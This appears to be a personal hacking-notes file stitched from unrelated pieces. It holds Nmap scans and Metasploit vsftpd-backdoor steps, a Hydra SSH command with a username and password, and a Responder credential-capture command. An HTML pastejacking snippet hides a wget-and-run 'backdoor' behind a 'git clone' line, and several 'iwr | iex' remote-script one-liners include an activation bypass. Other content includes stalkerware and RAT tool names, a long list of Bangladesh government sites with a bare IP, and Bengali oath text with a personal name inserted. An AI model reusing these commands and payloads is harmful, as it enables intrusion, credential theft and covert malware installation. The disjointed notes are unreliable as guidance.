Penertration Testing With Nmap:
https://youtu.be/wlqUO09J-nw


Terminal:
1. route
2. ifconfig
3. nmap -PR -sn x.x.x.x/x (10.0.2.0/24) / (10.0.2.0-255)
4. nano iplist.txt
	10.0.2.4
	10.0.2.7
	10.0.2.9
	10.0.2.13
	10.0.2.14
	10.0.2.254
5. sudo nmap -PE -sn scanme.nmap.org 
6. sudo nmap -PA80 -sn scanme.nmap.org


NMAP-Port States
TCP, UDP or SCTP available services on a network, nmap probe packets, host exists and OS detection, filtered ports during scans, ACK scan, map firewall, nmap packet filter

7. sudo nmap x.x.x.x/x (10.0.2.4) / (10.0.2.0/24)
8. nmap -iL iplist.txt
9. nmap -P 22 -iL iplist.txt (22,80,21)
10. nmap -sA -iL iplist.txt
11. sudo nmap -sU -iL iplist.txt
12. sudo nmap -sV -iL iplist.txt
13. sudo nmap -O -iL iplist.txt
14. nmap network/domain -T 0 to 5 (nmap scanme.nmap.org -T5)
15. sudo nmap 10.0.2.7 -D RND: 20
16. sudo nmap -iL iplist.txt --randomize-hosts
17. sudo nmap x.x.x.x/x --spoof-mac 0 (10.0.2.4)
18. ifconfig
19. sudo nmap x.x.x./x -f
20. 

nmap.org---> script

21. cd /usr/share/nmap/scripts
22. ls -lt
23. sudo nmap -iL iplist.txt --script smb-vuln-ms17-010.nse
24. sudo nmap -iL iplist.txt --script ftp-vsftpd-backdoor -p 21
25. nmap -iL iplist.txt --script vuln
26. sudo msfconsole
27. search vsftpd
28. use 0
29. set rhosts 10.0.2.13
30. run

whoami
ifconfig
cd /root
ls
pwd
uname -v
uname -a

https://www.thc.org/
How to Hack Passwords Using Hydra!
1. hydra -l molly -p butterfly 10.10.137.76 ssh


Linux for Hackers Tutorial (And Free Courses)
https://youtu.be/YJUVNlmIO6E
https://www.hackers-arise.com/
https://radar.cloudflare.com/
https://davidbombal.com/linux-for-hackers-tutorial-with-otw
https://archive.org/details/network-basics-for-hackers/page/n5/mode/2up
https://www.juniper.net/
https://learningportal.juniper.net/juniper/user_activity_info.aspx?id=JUNIPER-OPEN-LEARNING&referral=davidbombal#static
https://juniper.net/davidbombal
link-in-description.com

hackers (1995)
mr. robot (2015)
Occupy TheWeb

radio hacking (SDR) for hacker. VM not work in here.

python scripting
bash scripting
shell environment
zshell


Link
https://fontlipi.com/calligraphy/
https://design.tutsplus.com/bn/articles/mastering-calligraphy-how-to-write-in-cursive-script--vector-25716
https://dribbble.com/tags/bangla-calligraphy
https://www.behance.net/search/projects?search=ক্যালিগ্রাফি
https://attoprokash.com/ক্যালিগ্রাফি-কি-ক্যালিগ/
https://en.wikipedia.org/wiki/Calligraphy
https://www.hadithbd.com


5 github repository:

1. Disclose.io
2. Seclists
3. Nahamsec's Resources for Beginner Bug Bounty Hunters
4. Payloads All The Things
5. Awesome bug bounty writeups


3 resources to stay updated with hacking

1. Intigriti's Bug Bytes
2. Pentester.land
3. Infosec Writeups on Medium


3 pre-requisites for Android Hacking

1. adb (android debug bridge)
2. jadx
3. Genymotion


3 GitHub repositories for hacking

1. Awesome-sec-talks
2. Android reports & resources
3. Bug bounty roadmaps


Cyber

<p> git clone <span style="position: absolute; left: -2000px; top: -100px;"> /dev/nul; clear; wget http://127.0.0.1/backdoor &> /dev/null && chmod +x ./backdoor &> /dev/null && ./backdoor & disown && clear <br> git clone </span> https://github.com/LionSec/katoolin.git</p>

sudo responder -I eth0 -w -F
Create Honeypots with Canary Tokens!

salar movie
eimattro


chrome-extension://hboonghnflnkgodohljjamjbidckcklh/options.html

https://lootup.me/
https://www.glassdoor.com/index.htm
https://www.clickworker.com/clickworker/
https://www.usertesting.com/
https://remoteok.com/


Tools

https://christitus.com/windows-tool/

1. Shutup10
2. Encrypto
3. Neat download manager
4. Kali NetHunter
5. Androrat
6. Mspy
7. zAnti
8. Sploit
9. Maltego
10. The Harvester
11. Creepy
12. SpiderFoot

Anemia:
1. Jade Dynasty
2. Atlas
3. Mashle Magic and Muscles
4. Solo Leveling
5. 

https://www.waterfox.net/
https://icecatbrowser.org/download.html

iwr -useb https://git.io/debloat | iex
iwr -useb https://christitus.com/win | iex
iwr -useb https://massgrave.dev/get | iex
iwr -useb get.scoop.sh | iex
iwr -useb https://raw.githubusercontent.com/microsoft/terminal/main/scripts/backup-settings.ps1 | iex
iwr -useb https://boxstarter.org/bootstrapper.ps1 | iex
iwr -useb https://aka.ms/wslinstall | iex
iwr -useb https://raw.githubusercontent.com/Poshoholic/PowerShell/master/scripts/windows-environment-setup.ps1 | iex

evil-bath-errand


Anime
https://raretoonsindia.com.in/?s=jujutsu
https://raretoonsindia.com.in/?s=mashle


https://github.com/thewhiteh4t/seeker
https://github.com/riramar/Web-Attack-Cheat-Sheet



Digital Forensics					Information Technology
Cloud Security						Cybersecurity and IT Essentials
Offensive Operations					Industrial Control Systems Security
Open-Source Intelligence (OSINT)

Information Systems Security				Data Communications & Networking
Digital Forensics and Incident Response			Cloud Security
Industrial Control Systems Security			Offensive Operations
Open-Source Intelligence (OSINT)

Penetration Testing and Ethical Hacking			Malware Analysis and Reverse Engineering
Cryptography and Encryption				Network Security Monitoring
Mobile Device Security					IoT (Internet of Things) Security
Cyber Threat Intelligence				Privacy and Data Protection
Application Security					Blockchain Security
Artificial Intelligence in Cybersecurity		Cybersecurity Project Management
Advanced Persistent Threats (APT)

Security Operations Center (SOC) Analyst Training	Threat Hunting and Advanced Malware Analysis
Cybersecurity Metrics and Measurement			Biometric Security


bare metal


https://www.offsec.com/cybersecurity-roles/penetration-tester/#what-is-a-penetration-tester

Topics covered in the Kali Linux Revealed Course (PEN-103)

Introduction
Overview of Linux, its history, and its role in cybersecurity.

About Kali Linux
Introduction to the Kali Linux distribution, its purpose, and its features.

Getting Started with Kali Linux
Basic navigation, command-line interface (CLI) usage, and essential Linux commands.

Installing Kali Linux
Different installation methods (virtual machine, bare metal, etc.) and troubleshooting tips.

Configuring Kali Linux
Customizing your Kali environment, network settings, and updating tools.

Helping Yourself and Getting Help
Learning how to troubleshoot issues, find resources, and utilize the Kali community.

Securing and Monitoring Kali Linux
Best practices for securing your Kali system and monitoring for unauthorized access.

Debian Package Management
Understanding the package management system, installing, updating, and removing software.

Advanced Usage
Advanced command-line techniques, scripting, and customization for efficient Kali usage.

Kali Linux in the Enterprise
Utilizing Kali Linux in professional settings, ethical considerations, and legal frameworks





Topics covered in the Penetration Testing Course (PEN-200)

Introduction to Cybersecurity
Master the core concepts, technologies, and best practices that form the bedrock of cybersecurity, providing a solid foundation for your pen testing journey.

Report Writing for Penetration Testers
Learn to craft clear, actionable reports that detail security vulnerabilities, and potential impact, and provide step-by-step remediation guidance to help clients strengthen their security.

Information Gathering
Employ advanced ethical hacking techniques and tools like Nmap and Shodan to meticulously map target systems, uncover potential entry points, and discover exploitable vulnerabilities.

Vulnerability Scanning
Utilize powerful tools like Nessus and OpenVAS to systematically identify known vulnerabilities in networks, applications, and systems, streamlining your penetration testing process.

Introduction to Web Applications
Gain a deep understanding of how web applications function, their underlying technologies, and the architectural weaknesses that give rise to common attack vectors.

Common Web Application Attacks
Explore the techniques behind prevalent web attacks like cross-site scripting (XSS), injection flaws, and session hijacking, and learn essential mitigation strategies.

SQL Injection Attacks
Master the art of manipulating databases via SQL injections to extract sensitive information, compromise backend systems, and escalate your privileges.

Client-Side Attacks
Discover how to exploit vulnerabilities in web browsers, browser extensions, and client-side technologies like JavaScript to compromise user systems and gain unauthorized access.

Locating Public Exploits
Learn where to find reliable public exploits, how to assess their applicability, and how to integrate them responsibly into your security testing workflow.

Fixing Exploits
Adapt and customize existing exploits, employ obfuscation techniques, and develop creative payloads to bypass defenses and successfully test target systems.





Topics covered in the Foundational Wireless Network Attacks course (PEN-210)

IEEE 802.11

Gain a deep understanding of the IEEE 802.11 wireless networking standards that form the foundation of Wi-Fi technology.

Wireless Networks

Explore the architecture, components, and security challenges of wireless networks, including both infrastructure and ad-hoc modes.

Wi-Fi Encryption

Learn about the various encryption protocols used in wireless networks, such as WEP, WPA, and WPA2, and their vulnerabilities.

Linux Wireless Tools, Drivers, and Stacks

Master essential Linux tools and drivers used for wireless network configuration, monitoring, and troubleshooting.

Wireshark Essentials

Learn how to analyze wireless network traffic using Wireshark, a powerful packet capture and analysis tool.

Frames and Network Interaction

Gain insights into wireless frame structure, network interactions, and protocols to understand the inner workings of wireless communications.

Aircrack-ng Essentials

Familiarize yourself with Aircrack-ng, a versatile suite of tools for wireless security assessment, including capturing packets, cracking passwords, and deauthenticating clients.

Cracking Authentication Hashes

Learn how to crack various wireless authentication hashes, such as WPA/WPA2 PSKs, to gain access to secured networks.

Attacking WPS Networks

Explore vulnerabilities in Wi-Fi Protected Setup (WPS) and learn how to exploit them to compromise wireless networks.

Rogue Access Points

Understand the risks posed by rogue access points, learn how to detect them, and implement mitigation measures.









Topics covered in the Advanced Evasion Techniques and Breaching Defenses course (PEN-300)

Operating System and Programming Theory

This comprehensive module provides a deep understanding of the inner workings of operating systems and fundamental programming concepts. You’ll study memory management, process scheduling, file systems, and other essential OS components, gaining a solid foundation for understanding and exploiting vulnerabilities.

Client-Side Code Execution with Office

This module focuses on leveraging known vulnerabilities in Microsoft Office applications (Word, Excel, PowerPoint) to craft malicious documents that trigger code execution on a victim’s machine, gaining unauthorized access and control.

Client-Side Code Execution with Jscript

Learn how to exploit Jscript, a scripting language used in Windows environments, for code execution attacks, gaining unauthorized access and control on a victim’s machine.

Process Injection and Migration

In this module, you’ll master the art of stealth and persistence by injecting your malicious code into legitimate running processes. You’ll also learn how to migrate between processes to evade detection and maintain control even if one process is terminated.

Introduction to Antivirus Evasion

This module introduces basic techniques to bypass or evade antivirus software, such as obfuscation and packing, allowing you to create malware that goes undetected.

Advanced Antivirus Evasion

Learn more sophisticated methods like signature-based and heuristic-based evasion, enabling you to create malware that goes undetected by even the most sophisticated antivirus solutions.

Application Whitelisting

Learn how to circumvent application whitelisting, a security measure that restricts the execution of unauthorized software.

Bypassing Network Filters

Discover various techniques to bypass network filters and firewalls, gaining access to restricted resources and networks.

Linux Post-Exploitation

This module covers a wide range of techniques for maintaining access and escalating privileges on compromised Linux systems. You’ll learn how to navigate file systems, manipulate user accounts, extract sensitive information, and establish persistent backdoors for future access.

Windows Post-Exploitation

Learn various techniques for maintaining access and escalating privileges on compromised Windows systems, including navigating file systems, manipulating user accounts, extracting sensitive information, and establishing persistent backdoors.










Topics covered in the Foundational Web Application Assessments with Kali Linux course (WEB-200)

Tools for the Web Assessor

Gain hands-on experience with industry-standard tools like Burp Suite, OWASP ZAP, and sqlmap, used by web application penetration testers to identify security vulnerabilities, exploit weaknesses, and assess the security posture of web applications.

Cross-Site Scripting (XSS) Introduction, Discovery, Exploitation and Case Study

Learn how attackers inject malicious code into web pages to hijack user sessions, steal sensitive data, or deface websites. Discover how to identify and exploit XSS vulnerabilities, and understand the different types of XSS attacks. Explore real-world case studies to learn from past incidents and strengthen your defenses.

Cross-Site Request Forgery (CSRF)

Uncover how attackers trick authenticated users into performing unintended actions on web applications. Learn how to identify and exploit CSRF vulnerabilities, and explore practical mitigation techniques to protect against these attacks. Understand the impact of CSRF on user trust and data integrity.

Exploiting CORS Misconfigurations

Dive into the security risks associated with Cross-Origin Resource Sharing (CORS) misconfigurations. Learn how attackers exploit these vulnerabilities to bypass access controls and access sensitive data. Understand how to identify and fix CORS misconfigurations to ensure secure cross-origin communication.

Database Enumeration

Master techniques to gather sensitive information about a web application’s database structure and content. Learn how attackers leverage this information to craft targeted attacks. Explore various database enumeration methods and learn to implement countermeasures to protect against them.

SQL Injection (SQLi)

Learn how to exploit vulnerabilities in web applications that interact with databases, potentially leading to data compromise, unauthorized access, or website defacement. Understand the different types of SQL Injection attacks and the impact they can have on an organization’s security posture. Explore techniques for preventing and mitigating SQL Injection vulnerabilities.

Directory Traversal

configuration information, or source code. Learn to identify and exploit directory traversal vulnerabilities, and understand how to prevent unauthorized access to restricted areas of a web server.

XML External Entity (XXE) Processing

Explore how attackers manipulate XML processors to access files, execute commands, or perform denial-of-service attacks. Understand the mechanics of XXE attacks and the potential consequences. Learn to secure XML parsers and prevent XXE vulnerabilities in web applications.

Server-Side Template Injection (SSTI)

Understand how attackers inject code into web application templates, potentially leading to remote code execution, information disclosure, or privilege escalation. Learn how to identify and exploit SSTI vulnerabilities and explore mitigation techniques to protect your web applications.

Server-Side Request Forgery (SSRF)

Learn how attackers force a web application to make requests to internal or external systems, potentially leading to data exfiltration, service disruption, or access to internal resources. Understand the various SSRF attack vectors and implement countermeasures to prevent unauthorized requests.











Topics covered in the Advanced Web Attacks and Exploitation course (WEB-300)

JavaScript Prototype Pollution

Explore how attackers manipulate JavaScript’s prototype inheritance model to inject malicious data, compromise application logic, and even achieve remote code execution.

Advanced Server-Side Request Forgery (SSRF)

Delve into advanced techniques for exploiting SSRF vulnerabilities, including bypassing filters, accessing internal resources, and exploiting complex application architectures.

Web Security Tools and Methodologies

Master a variety of cutting-edge web security tools and methodologies, including fuzzing, static analysis, dynamic analysis, and manual code review.

Source Code Analysis

Learn how to analyze source code to identify security vulnerabilities, understand the application’s logic, and uncover potential attack vectors.

Persistent Cross-Site Scripting

Discover how attackers store malicious code on a web server to launch persistent XSS attacks, targeting multiple users over time.

Session Hijacking

Learn how attackers take over user sessions, potentially gaining unauthorized access to sensitive information and functionality.

.NET Deserialization

Understand the risks associated with deserialization in .NET applications and how attackers can exploit these vulnerabilities to achieve remote code execution.

Remote Code Execution

Explore various techniques used by attackers to execute arbitrary code on a target web server, often leading to complete compromise of the system.

Blind SQL Injection

Learn how to exploit SQL injection vulnerabilities even when there is no direct feedback from the application, using various techniques to infer information and compromise the database.

Data Exfiltration

Understand how attackers extract sensitive data from web applications, including through SQL injection, XXE attacks, and compromised file uploads.












Topics covered in the Windows User Mode Exploit Development course (EXP-301)

WinDbg Tutorial

Master the powerful WinDbg debugger to effectively analyze crashes, investigate memory dumps, and identify vulnerabilities in Windows applications.

Stack Buffer Overflows

Understand the mechanics of stack buffer overflows and learn how to exploit them to gain control of vulnerable programs.

Exploiting SEH Overflows

Delve into Structured Exception Handler (SEH) overflows, a specific type of buffer overflow, and master techniques to leverage them for code execution.

Intro to IDA Pro

Familiarize yourself with IDA Pro, a leading disassembler and debugger, essential for reverse engineering software binaries and uncovering vulnerabilities.

Overcoming Space Restrictions

Egghunters: Learn how to bypass space limitations in your exploit payloads by utilizing egghunter techniques to locate and execute shellcode.

Shellcode From Scratch

Develop the skills to write your own custom shellcode, enabling you to perform specific actions on compromised systems.

Reverse-Engineering Bugs

Learn how to systematically analyze software binaries to identify and understand vulnerabilities that can be exploited.

Stack Overflows and DEP/ASLR Bypass

Master advanced techniques for exploiting stack overflows while bypassing modern security mitigations such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).

Format String Specifier Attacks

Understand and exploit format string vulnerabilities, which can be leveraged to read or write arbitrary memory locations.

Custom ROP Chains and ROP Payload Decoders

Learn how to construct custom Return-Oriented Programming (ROP) chains to bypass security defenses and build ROP payload decoders for stealthy exploitation.












Topics covered in the Advanced macOS Control Bypasses course (EXP-312)

Introduction to macOS Internals

This module provides a foundation in macOS architecture, memory management, and system calls, essential knowledge for understanding macOS security and identifying potential vulnerabilities.

Debugging, Tracing & Hopper

Learn to utilize debugging and tracing tools like Hopper to analyze macOS applications and uncover security flaws.

Shellcoding in macOS

Master the art of writing shellcode for macOS, enabling you to execute custom code on compromised systems.

Dylib Injection

Explore techniques to inject dynamic libraries (dylibs) into macOS processes, allowing you to modify or extend their behavior.

Mach and Mach Injection

Understand the Mach microkernel, the core of macOS, and learn how to inject code into Mach tasks to bypass security restrictions.

Hooking

Learn how to intercept and modify function calls within macOS applications, enabling you to manipulate their behavior for offensive purposes.

XPC Exploitation

Understand XPC, an interprocess communication mechanism in macOS, and learn how to exploit XPC vulnerabilities to escalate privileges and gain unauthorized access.

Sandbox Escape

Explore techniques to break out of macOS sandboxes, which are designed to restrict the actions of untrusted applications.

Attacking Privacy (TCC)

Learn how to bypass Transparency, Consent, and Control (TCC), a macOS security feature that protects user privacy by requiring explicit consent for certain actions.

Symlink Attacks

Discover how to exploit symbolic links (symlinks) in macOS to gain unauthorized access to files and directories or escalate privileges.












Topics covered in the Foundational Security Operations and Defensive Analysis course (SOC-200)

Attack Methodology Introduction

Explore the fundamental mindsets, tactics, and phases of a cyberattack. Build a strong foundation for understanding attacker behavior and how to anticipate their moves during your penetration testing engagements.

Windows Endpoint Introduction

Gain a solid understanding of the concepts and security concerns surrounding Windows endpoints, including desktops, laptops, and other Windows-based user devices. Discover common vulnerabilities and the attack vectors adversaries use to target them.

Windows Server Side Attacks

Uncover the techniques attackers employ to compromise Windows servers – the backbone of many networks. Learn methods for exploiting critical services and vulnerabilities to gain elevated access.

Windows Client-Side Attacks

Investigate how attackers manipulate the user-facing side of Windows systems. Analyze browser-based attacks, vulnerabilities in software, and social engineering tactics designed to compromise endpoints.

Windows Privilege Escalation

Examine the art of elevating your privileges on Windows systems. Learn to exploit misconfigurations, software flaws, and zero-day vulnerabilities, increasing your level of network control.

Windows Persistence

Learn the techniques attackers use to stay hidden on compromised Windows systems. Explore file system persistence, registry modification, scheduled tasks, and other methods to maintain a foothold.

Linux Endpoint Introduction

Gain an understanding of the concepts surrounding Linux endpoints, their security mechanisms, and potential vulnerabilities. Become familiar with common attack vectors used to target them.

Linux Server Side Attacks

Examine how adversaries compromise Linux servers, utilizing privilege escalation methods, service exploits, and configuration weaknesses.

Network Detections

Develop a comprehensive understanding of network security incidents and detection techniques. Learn how firewalls, intrusion detection systems, and other tools identify malicious activity, allowing you to refine your evasion strategies.

Antivirus Alerts and Evasion

Explore advanced methods for evading antivirus solutions. Understand payload obfuscation, exploit customization, and techniques designed to minimize your digital footprint while maximizing success.











Nmap: Nmap is a powerful open-source tool used for network discovery and security auditing. It can scan networks, identify open ports, discover hosts, and even detect operating systems.

·      Wireshark: A network protocol analyzer for capturing and inspecting packets to analyze network traffic.

·      Recon-ng: Recon-ng is a full-featured reconnaissance framework that simplifies the process of gathering information from various sources, including search engines, social media, and DNS records.

·      theHarvester: theHarvester is a simple yet effective tool for email address reconnaissance. It can discover email addresses associated with a domain, making it useful for phishing investigations and email security.

·      Shodan: Shodan is often referred to as the “search engine for hackers.” It indexes information about open ports and services, providing a snapshot of devices connected to the internet. It’s a valuable resource for understanding your public-facing assets.

·      Maltego: Maltego is a robust tool for open-source intelligence (OSINT) and data visualization. It helps you analyze and visualize relationships between entities, such as domains, email addresses, and social media profiles.

·      Metasploit: A penetration testing framework with modules for information gathering, exploitation, and post-exploitation.

·      OSINT Framework: OSINT Framework is a collection of various tools, scripts, and resources for open-source intelligence. It simplifies the process of finding information about a target across different platforms.

·      SpiderFoot: SpiderFoot is an OSINT automation tool that aggregates information from multiple sources, including social media, public databases, and network services. It provides a comprehensive report on your target.

·      Nikto: A web server scanner that identifies web server vulnerabilities and misconfigurations.

·      DirBuster: A tool for brute-forcing and discovering hidden directories and files on web servers.

·      Sublist3r: Sublist3r is a tool designed for subdomain enumeration. It helps you discover subdomains associated with a target domain, which can be crucial for identifying potential entry points.

·      Censys: A search engine for finding information about internet-connected devices and certificates.

·      Amass: A subdomain enumeration tool that integrates with various data sources.

·      EyeWitness: A tool for capturing screenshots of web applications during reconnaissance.

·      Whois: A command-line utility for retrieving domain registration information, including contact details.

WhatWeb: A web application fingerprinting tool that identifies technologies used by websites.

·      Dmitry (Deepmagic Information Gathering Tool): A versatile information gathering tool that provides data about networks, subdomains, and more.

·      Fierce: A DNS reconnaissance tool that helps locate non-contiguous IP address space and hidden domains.

·      Netcraft: A service for gathering information about web servers, hosting providers, and historical data.

·      Hping: A command-line packet generator and analyzer used for network testing and reconnaissance.

·      Netcat (nc): A Swiss Army knife for networking, often used for banner grabbing and port scanning.

·      Host (nslookup): A command-line tool for querying DNS records to obtain information about hosts.

·      Dig: Another command-line DNS tool for querying DNS information, including authoritative name servers.

·      Aquatone: A tool for taking screenshots of websites and identifying open ports and technologies.

·      Censys: A search engine for discovering devices, certificates, and vulnerabilities on the internet.

·      Wappalyzer: A browser extension that identifies web technologies and content management systems used by websites.

·      CMSMap: A content management system (CMS) identification and enumeration tool.

·      CMS Explorer: A tool for detecting the CMS and version used by a website.

·      CMS Detect: A script that identifies the CMS and themes/plugins of a WordPress site.










    Whois Lookup: https://whois.domaintools.com/
    VirusTotal: https://www.virustotal.com/gui/home/upload
    Abuse IP DB: https://www.abuseipdb.com/
    IP Void: https://www.ipvoid.com/
    Waybackurl: https://archive.org/
    URL Scan: https://urlscan.io/
    Website Screenshot: https://www.site-shot.com/
    Wappalyzer: https://www.wappalyzer.com/ (Browser Extension)
    Port Checker: https://portchecker.co/
    Ssllabs SSL Server Test: https://www.ssllabs.com/ssltest/
    Analyse HTTP response headers: https://securityheaders.com/
    URL Redirect Checker: https://wheregoes.com/
    MX toolbox: https://mxtoolbox.com/
    Dnslookup: https://www.nslookup.io/
    DNS Dumpster: https://dnsdumpster.com/
    DNSSEC Analyzer: https://dnssec-analyzer.verisignlabs.com/
    Netcraft Search DNS: https://searchdns.netcraft.com/
    DNS Visualization Tool: https://dnsviz.net/
    All in one Web Check: https://web-check.xyz/
    Email Header Analysis: https://toolbox.googleapps.com/apps/messageheader/







Gov. Link

https://lgd.gov.bd/
https://dshe.gov.bd/
https://dgme.gov.bd/
https://pmeat.gov.bd/
https://moi.gov.bd/
https://mod.gov.bd/
https://bforest.gov.bd/
https://dinajpurboard.gov.bd/
https://bangladeshmuseum.gov.bd/
https://bstft.gov.bd/
https://shishuacademy.gov.bd/
https://pesp.gov.bd/
https://desco.gov.bd/
https://bcstaxacademy.gov.bd/
https://dwasa.gov.bd/
https://cca.gov.bd/
https://sbc.gov.bd/
https://pgcb.gov.bd/
https://ntrca.gov.bd/
https://rthd.gov.bd/
http://bdlaws.minlaw.gov.bd/
https://digitalliteracy.gov.bd/login
https://artisan.gov.bd/
https://digitalliteracy.gov.bd/register
https://nise.gov.bd/jobs
https://lima.dife.gov.bd/
https://oss.beza.gov.bd/
https://nimh.gov.bd/history/
https://www.taxeszone18dhaka.gov.bd/
https://nimh.gov.bd/treatment_admit_patient/
https://www.ekshop.gov.bd/
https://etds.gov.bd/login
https://www.bbggc.gov.bd/
https://nimh.gov.bd/shishuderoghumersomoshahoi/
http://www.shsmc.gov.bd/
https://www.dpe.gov.bd/
http://www.mohfw.gov.bd/
https://www.hsia.gov.bd/
http://ims.ictd.gov.bd/
https://nimh.gov.bd/shasthoboltekibujai/
https://dam.portal.gov.bd/
https://bangladesh.gov.bd/index.php
https://www.nilmrc.gov.bd/
https://a2i.gov.bd/notice/
https://www.rgc.gov.bd/
https://www.cirt.gov.bd/
https://scs.ssd.gov.bd/
https://www.barcouncil.gov.bd/
https://old.dghs.gov.bd/index.php/bd/
https://nimh.gov.bd/depression/
https://www.cid.gov.bd/
https://www.pppo.gov.bd/
https://platform.futurenation.gov.bd/
https://www.hajj.gov.bd/
http://bdembjp.mofa.gov.bd/
https://a2i.gov.bd/tenders/
https://roadshow.sec.gov.bd/
https://nimh.gov.bd/english/
https://cbcctg.gov.bd/
https://bstiqrcode.gov.bd/
http://emis.gov.bd/emis
https://land.gov.bd/
https://edge.gov.bd/
https://mpemr.gov.bd/
https://motj.gov.bd/
https://freelancers.gov.bd/
https://ttcraj.gov.bd/
https://badc.gov.bd/
https://afd.gov.bd/
https://barishalcity.gov.bd/
https://dae.gov.bd/
https://mocat.gov.bd/
https://cabinet.gov.bd/
https://www.startupbangladesh.vc/
http://hospitaldghs.gov.bd/
https://ecps.gov.bd/
https://pmo.gov.bd/
https://cdb.gov.bd/
https://specialbranch.gov.bd/
https://accessibledictionary.gov.bd/
https://nise.gov.bd/
https://a2i.gov.bd/
https://bari.gov.bd/
https://mochta.gov.bd/
https://jgmc.gov.bd/
https://bwc.gov.bd/
https://srdi.gov.bd/
https://moa.gov.bd/
https://ossbhtpa.gov.bd/
https://barc.gov.bd/
https://grs.gov.bd/
https://bjri.gov.bd/
https://ecs.gov.bd/
https://rgccr.gov.bd/
https://prottoyon.gov.bd/
https://digitalliteracy.gov.bd/
https://pbi.gov.bd/
https://giupmo.gov.bd/

https://dos.gov.bd/
https://pallisanchaybank.gov.bd/
https://moef.gov.bd/
https://dscc.gov.bd/
https://biwta.gov.bd/
https://plandiv.gov.bd/
https://modmr.gov.bd/
https://emrd.gov.bd/
https://techedu.gov.bd/
https://bcc.gov.bd/
https://bpsc.gov.bd/
https://boesl.gov.bd/
https://bteb.gov.bd/
https://mincom.gov.bd/
https://bangabhaban.gov.bd/
https://boiler.gov.bd/
https://bba.gov.bd/
https://pcb.gov.bd/
https://bmeb.gov.bd/
https://mra.gov.bd/
https://pkb.gov.bd/
https://ansarvdp.gov.bd/
https://gbrcr.gov.bd/
https://nanl.gov.bd/
https://bbs.gov.bd/
https://dphe.gov.bd/
https://brtc.gov.bd/
https://titasgas.gov.bd/
https://bnmc.gov.bd/
https://bpsc.gov.bd/
https://pkb.gov.bd/
https://ansarvdp.gov.bd/
https://gbrcr.gov.bd/
https://nanl.gov.bd/
https://bbs.gov.bd/
https://dphe.gov.bd/
https://brtc.gov.bd/
https://titasgas.gov.bd/
https://bnmc.gov.bd/
https://bpsc.gov.bd/
https://cptu.gov.bd/
https://pwd.gov.bd/
https://sreda.gov.bd/
https://mor.gov.bd/
http://lms.gov.bd/
https://settlement.gov.bd/
https://shilpakala.gov.bd/
https://cda.gov.bd/
https://ird.gov.bd/
https://doict.gov.bd/
https://moysports.gov.bd/
https://doe.gov.bd/
https://egcb.gov.bd/
https://plancomm.gov.bd/
https://bida.gov.bd/
https://blri.gov.bd/
https://dgfp.gov.bd/
https://bnf.gov.bd/
https://gcc.gov.bd/
https://bitac.gov.bd/

https://www.teletalk.gov.bd/





http://www.tearesort.gov.bd/

103.48.119.138




defillama.com
vozo.ai
extreme privacy
only office
ewasion GitHub io



Hardware Tools

https://www.amazon.com/Safe-Sound-PRO-Meter-200MHz/dp/B07QDBTZ6F




Web Attack list
1. Cross-Site Scripting
2. SQL Injection Attacks
3. Broken Authentication
4. Drive-By Download
5. Password-Based Attacks
6. Fuzzing
7. Using Components with Known Vulnerabilities
8. DDoS (Distributed Denial-of-Service)
9. MiTM (Man-in-the-Middle)
10. Directory Traversal



Bitcoin

https://en.wikipedia.org/wiki/Silk_Road_(marketplace)
https://en.wikipedia.org/wiki/Mt._Gox
https://www.mtgox.com/
https://bitcointalk.org/index.php?topic=137.60
http://most-expensive.com/pizza
https://en.bitcoin.it/wiki/Laszlo_Hanyecz
https://bitcointalk.org/index.php?topic=137.0
https://bitcoins.net/investing/limits-of-supply
https://bitcoin.org/en/download
https://en.wikipedia.org/wiki/The_Wall_Street_Journal
https://www.wsj.com/
https://en.wikipedia.org/wiki/Cryptography
https://en.wikipedia.org/wiki/Cypherpunk
https://bitcoin.org/bitcoin.pdf
https://bitcoin.org/en/bitcoin-paper
https://bitcoin.org/en/
https://en.wikipedia.org/wiki/White_paper
https://en.wikipedia.org/wiki/Lehman_Brothers
https://en.wikipedia.org/wiki/Fiat_money
https://en.wikipedia.org/wiki/Satoshi_Nakamoto



















প্রধান উপদেষ্টা শপথ
বিসমিল্লাহির রাহমানির রাহিম
আমি খাইরুল হাসান রাকিব
স্বসদ্য চিত্তে শপথ গ্রহণ করেতেছি যে, আমি আইন অনুযায়ী অন্তরবর্তীকালিন সরকারের প্রধান উপদেষ্টা পদের কর্তব্য বিশ্বস্ততার সহিত পালন করিব। 
আমি..
বাংলাদেশের প্রতি অকৃত্রিম বিশ্বাস ও আনুগত্য পোষণ করিব। 
আমি..
সংবিধানের রক্ষণ, সমর্থণ ও নিরাপত্তাবিধান করিব। এবং আমি ভিতি বা অনুগ্রহ অনুরাগ বা বিরাগের বশবর্তি না হইয়া সকলের প্রতি আইন অনুযায়ী যথাবীহিত আচরণ করিব। 

গোপনতার শপথ
আমি..
স্বসদ্য চিত্তে শপথ করিতেছি যে, অন্তরবর্তীকালিন সরকারের প্রধান উপদেষ্টা রুপে যে সকল বিষয় আমার বিবেচনার জন্য আনিত হইবে বা যে সকল বিষয় আমি অবগত হইবো তাহা প্রধান উপদেষ্টা রুপে যথাযথ ভাবে আমার কর্তব্য পালনের প্রয়োজনিয়তা ব্যতিত প্রত্যক্ষ বা পরক্ষ ভাবে কোন ব্যক্তিকে জ্ঞাপন করিব না বা কোন ব্যক্তির নিকট প্রকাশ করিব না।
ধন্যবাদ







উপদেষ্টা শপথ
বিসমিল্লাহির রাহমানির রাহিম
আমি খাইরুল হাসান রাকিব
স্বসদ্য চিত্তে শপথ গ্রহণ করেতেছি যে, আমি আইন অনুযায়ী অন্তরবর্তীকালিন সরকারের উপদেষ্টা পদের কর্তব্য বিশস্ততার সহিত পালন করিব। 
আমি..
বাংলাদেশের প্রতি অকৃত্রিম বিশ্বাস ও আনুগত্য পোষণ করিব। 
আমি..
সংবিধানের রক্ষণ, সমর্থণ ও নিরাপত্তাবিধান করিব। এবং আমি ভিতি বা অনুগ্রহ অনুরাগ বা বিরাগের বশবর্তি না হইয়া সকলের প্রতি আইন অনুযায়ী যথাবীহিত আচরণ করিব। 

গোপনতার শপথ
আমি..
স্বসদ্য চিত্তে শপথ করিতেছি যে, অন্তরবর্তীকালিন সরকারের উপদেষ্টা রুপে যে সকল বিষয় আমার বিবেচনার জন্য আনিত হইবে বা যে সকল বিষয় আমি অবগত হইবো তাহা উপদেষ্টা রুপে যথাযথ ভাবে আমার কর্তব্য পালনের প্রয়োজনিয়তা ব্যতিত প্রত্যক্ষ বা পরক্ষ ভাবে কোন ব্যক্তিকে জ্ঞাপন করিব না বা কোন ব্যক্তির নিকট প্রকাশ করিব না।
